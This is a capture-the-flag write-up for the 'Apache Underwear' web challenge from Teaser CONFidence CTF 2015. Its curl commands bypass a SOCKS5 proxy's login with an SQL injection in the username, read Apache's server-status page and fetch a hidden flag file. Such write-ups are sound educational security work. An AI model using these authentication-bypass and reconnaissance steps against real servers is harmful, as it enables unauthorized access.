# Teaser CONFidence CTF 2015: Apache Underwear

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| Teaser CONFidence CTF 2015 | Apache Underwear | Web |    400 |

**Description:**
>*Pwn [this server](http://134.213.136.187:8080/). Keep in mind, this is a web challenge :-O.*

----------
## Write-up

When connecting to the server, we are served the following page content:

>```html
>Youe IP (x.x.x.x) is too world wide ;<!-- Try wearing socks on 9090 , then visit local apache :) -->
>```

Obviously this is a hint at the fact that the server only accepts connections coming from the local network (or localhost) and we have to connect to a socks server on port 9090 first.

Let's give it a first try:

>```bash
>$ curl --socks5 134.213.136.187:9090 http://127.0.0.1/
>curl: (7) No authentication method was acceptable. (It is quite likely that the SOCKS5 server wanted a username/password, since none was supplied to the server on this connection.)
>$ curl --socks5 ayy:lmao@134.213.136.187:9090 http://127.0.0.1/
>curl: (7) User was rejected by the SOCKS5 server (1 99).
>```

So we don't know the username and password to the socks5 server. Since this is a web challenge we made a wild guess that the socks5 server might use some kind of dbms backend to do user management, so we tried SQL injection:

>```bash
>$ curl --socks5 "' or 1=1/*:pass@134.213.136.187:9090" "http://127.0.0.1:8080/"
>Nice One ! close ...  <!-- your ip is local now, go deep into my tipi -->
>```

Ok, so that worked. After some messing around and trying various different pages we decided to give apache's [mod_status page](http://httpd.apache.org/docs/2.2/mod/mod_status.html) a try (since this will disclose quests currently being processed):

>```bash
>$ curl --socks5 "' or 1=1/*:pass@134.213.136.187:9090" "http://127.0.0.1:8080/server-status"
><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
><html><head>
><meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
><title>Apache Status</title>
></head><body>
><h1>Apache Server Status for 127.0.0.1</h1>
>(...)
><table border="0"><tbody><tr><th>Srv</th><th>PID</th><th>Acc</th><th>M</th><th>CPU
></th><th>SS</th><th>Req</th><th>Conn</th><th>Child</th><th>Slot</th><th>Client</th><th>VHost</th><th>Request</th></tr>
>
><tr><td><b>0-0</b></td><td>2989</td><td>0/2/2</td><td>_
></td><td>0.01</td><td>549</td><td>0</td><td>0.0</td><td>0.00</td><td>0.00
></td><td>127.0.0.1</td><td nowrap="nowrap">127.0.1.1</td><td nowrap="nowrap">GET /omg-omg-s3cr3t-file.txt HTTP/1.0</td></tr>
>
><tr><td><b>1-0</b></td><td>2990</td><td>0/1/1</td><td><b>W</b>
></td><td>0.01</td><td>0</td><td>0</td><td>0.0</td><td>0.00</td><td>0.00
></td><td>127.0.0.1</td><td nowrap="nowrap">127.0.1.1</td><td nowrap="nowrap">GET /server-status HTTP/1.1</td></tr>
>(...)
><address>Apache/2.2.22 (Ubuntu) Server at 127.0.0.1 Port 80</address>
>
></body></html>
>```

The following immediately stands out:

>*GET /omg-omg-s3cr3t-file.txt*

Let's try that one:

>```bash
>$ curl --socks5 "' or 1=1/*:pass@134.213.136.187:9090" "http://127.0.0.1:8080/omg-omg-s3cr3t-file.txt"
>DrgnS{S0xySqliAndAp4ch3}
>```